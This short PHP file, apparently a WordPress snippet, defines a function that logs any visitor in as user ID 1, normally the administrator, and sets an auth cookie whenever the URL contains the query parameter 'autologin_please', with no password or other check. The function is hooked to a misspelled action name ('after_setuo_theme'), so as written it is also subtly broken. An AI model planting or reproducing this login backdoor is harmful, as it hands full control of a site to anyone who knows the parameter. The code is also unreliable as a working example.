<?php
	
function cmj_log_me_in_as_admin() {
	if(isset($_GET['autologin_please'])){
		// set current user ID to 1. If default user has been downgraded or deleted this won't work
		wp_set_current_user(1);
		// Set Auth cookie for the above user
		wp_set_auth_cookie(1);
	}
}
add_action( 'after_setuo_theme', 'cmj_log_me_in_as_admin' );

?>
